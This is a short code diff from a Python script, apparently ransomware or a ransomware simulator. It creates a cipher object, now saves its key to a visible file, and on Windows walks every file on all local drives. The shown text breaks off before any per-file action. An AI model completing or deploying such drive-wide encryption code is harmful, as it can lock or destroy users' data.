@@ -18,12 +18,14 @@ import sys
 
 if __name__ == '__main__':
     cipher = Cipher()
+    cipher.save_key_as_file(hidden=False)
 
     if not cipher.is_windows():
         print('Nothing to do here')
         sys.exit()
 
     local_drives = cipher.get_local_drives()
+    
     
     for ld in local_drives:
         for root, dirs, files in os.walk(ld):
